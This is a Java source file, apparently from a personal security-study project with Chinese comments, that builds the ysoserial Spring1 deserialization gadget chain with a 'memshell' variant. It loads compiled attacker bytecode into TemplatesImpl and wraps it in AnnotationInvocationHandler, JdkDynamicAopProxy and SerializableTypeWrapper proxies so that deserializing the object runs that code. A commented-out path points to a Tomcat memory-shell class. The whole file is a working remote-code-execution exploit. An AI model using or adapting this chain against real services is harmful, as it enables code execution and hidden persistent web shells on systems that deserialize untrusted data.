package com.sec.cwm.base.ysoserial;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.ObjectFactory;



public class Spring1withMemshell {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String bytecode(String filename) throws Exception {
        File file=new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int a=0;
        while ((a = fis.read(bytes)) != -1) {
            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
            // 下标0开始截取，a表示输入流read到的字节数。
            out.write(bytes, 0, a);
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(bytes);
        return encodedText;
    }
    public static String fileName = "Spring1.bin";

    public static void main(String[] args) throws Exception {
//        String bytecode=bytecode("/home/cwm/IdeaProjects/javastudy/target/classes/tomcatshell.class");
        String bytecode=bytecode("/home/cwm/IdeaProjects/javastudy/target/classes/HelloTempImpl.class");
        byte[] code = Base64.getDecoder().decode(bytecode);

        // 生成包含恶意类字节码的 TemplatesImpl 类
        TemplatesImpl tmpl=new TemplatesImpl();
        setFieldValue(tmpl,"_bytecodes",new byte[][]{code});
        setFieldValue(tmpl,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(tmpl, "_name", "HelloTempImpl");

        // 使用 AnnotationInvocationHandler 动态代理
        // 实例化 AdvisedSupport
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(tmpl);

        // 使用 AnnotationInvocationHandler 动态代理
        Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl
        // 并且会调用 method.invoke(返回值,args)
        // 此时返回值被我们使用动态代理改为了 TemplatesImpl
        // 接下来需要 method 是 newTransformer()，就可以触发调用链了
        Class<?>       clazz          = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> aopConstructor = clazz.getDeclaredConstructors()[0];
        aopConstructor.setAccessible(true);
        // 使用 AdvisedSupport 实例化 JdkDynamicAopProxy
        InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(as);

        // JdkDynamicAopProxy 本身就是个 InvocationHandler
        // 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法
        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
        // 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, aopProxy);


        // 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
        HashMap<String, Object> map2 = new HashMap<>();
        map2.put("getType", typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map2);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);


        // 初始化 MethodInvokeTypeProvider
        Class<?>       clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field  field   = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

//        FileOutputStream fops=new FileOutputStream(fileName);
//        ObjectOutputStream oos = new ObjectOutputStream(fops);
//        oos.writeObject(objects);
//        oos.close();
//        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(fileName));
//        ois.readObject();
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(objects);
        oos.close();
        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
